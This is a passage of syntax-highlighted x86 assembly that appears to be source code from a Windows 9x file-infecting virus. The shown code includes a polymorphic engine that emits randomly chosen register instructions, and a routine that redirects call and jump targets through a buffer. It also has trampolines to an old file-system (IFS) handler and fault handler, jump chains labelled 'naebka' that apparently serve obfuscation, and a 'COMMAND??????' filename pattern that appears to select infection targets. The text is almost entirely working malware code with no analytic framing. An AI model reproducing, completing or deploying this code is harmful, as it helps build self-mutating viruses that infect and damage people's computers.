                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">push_num</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__2</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">reg2</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">__rand</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_eax</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x_0</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x_1</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__opt1</span><span class="sc0">

</span><span class="sc5">__x_x_x</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">__ret</span><span class="sc4">:</span><span class="sc0">

                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">__x_0</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; mov r1, r2</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__rand</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">89h</span><span class="sc0">

</span><span class="sc5">__stosb</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__x_x_x</span><span class="sc0">


</span><span class="sc5">__x_1</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">; xor r1, r2</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__stosb</span><span class="sc0">

</span><span class="sc5">__x_2</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">; add r1, r2</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__stosb</span><span class="sc0">

</span><span class="sc5">__x_3</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">; sub r1, r2</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">29h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__stosb</span><span class="sc0">

</span><span class="sc5">__x_4</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">; not r1</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d0f7h</span><span class="sc0">

</span><span class="sc5">__orahclstosb</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__x_x_x</span><span class="sc0">


</span><span class="sc5">__opt1</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x_2</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x_3</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x_4</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x_5</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x_6</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x_7</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x_8</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__opt2</span><span class="sc0">

</span><span class="sc5">__x_5</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">; neg r1</span><span class="sc0">

                        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d8f7h</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__orahclstosb</span><span class="sc0">

</span><span class="sc5">__x_6</span><span class="sc4">:</span><span class="sc0">
                                                   </span><span class="sc1">; shl r1, 1</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e0d1h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__orahclstosb</span><span class="sc0">

</span><span class="sc5">__x_7</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">; shr r1, 1</span><span class="sc0">

                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8d1h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__orahclstosb</span><span class="sc0">


</span><span class="sc5">__x_8</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">; rol r1, 1</span><span class="sc0">
                        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0d1h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__orahclstosb</span><span class="sc0">



</span><span class="sc5">__x_9</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">; ror r1, 1</span><span class="sc0">
                        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c8d1h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__orahclstosb</span><span class="sc0">

</span><span class="sc5">__x_10</span><span class="sc4">:</span><span class="sc0">                                            </span><span class="sc1">; sar r1, 1</span><span class="sc0">
                        </span><span class="sc6">sar</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f8d1h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__orahclstosb</span><span class="sc0">

</span><span class="sc5">__x_11</span><span class="sc4">:</span><span class="sc0">                                            </span><span class="sc1">; xchg r1, r2</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">87h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__stosb</span><span class="sc0">

</span><span class="sc5">__x_12</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">; and r1, r2</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__stosb</span><span class="sc0">

</span><span class="sc5">__opt2</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x_9</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x_10</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x_11</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x_12</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x_13</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x_14</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__x_15</span><span class="sc0">

</span><span class="sc5">__x_x</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__x_x_x</span><span class="sc0">

</span><span class="sc5">__x_13</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">; or r1, r2</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__stosb</span><span class="sc0">

</span><span class="sc5">__x_14</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">; inc r1</span><span class="sc0">

                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">

</span><span class="sc5">__oralclstosb</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__x_x</span><span class="sc0">

</span><span class="sc5">__x_15</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">; dec r1</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc5">em_eax</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__oralclstosb</span><span class="sc0">

</span><span class="sc5">replace_proc</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">replace_buf_ptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">replace_buf_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">replace_buf</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">replace_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">replace_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_eax</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">replace_start</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">lodsb</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__2</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__2</span><span class="sc0">

                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__1</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__exit</span><span class="sc0">

</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">lodsd</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">replace_start</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">replace_end</span><span class="sc0">   </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">replace_buf_ptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">

</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">naebka_9</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">naebka_8</span><span class="sc0">

</span><span class="sc5">replace_buf_size</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1024</span><span class="sc0">
</span><span class="sc5">replace_buf</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">replace_buf_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">replace_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">replace_buf_ptr</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">go_old_ifs_handler</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">oldhandler_ptr_ptr</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc5">go_prev_fault</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0">
</span><span class="sc5">fault_previous</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">naebka_7</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">naebka_9</span><span class="sc0">

                                </span><span class="sc1">;1234567890123</span><span class="sc0">
</span><span class="sc5">kewl_names</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'COMMAND??????'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

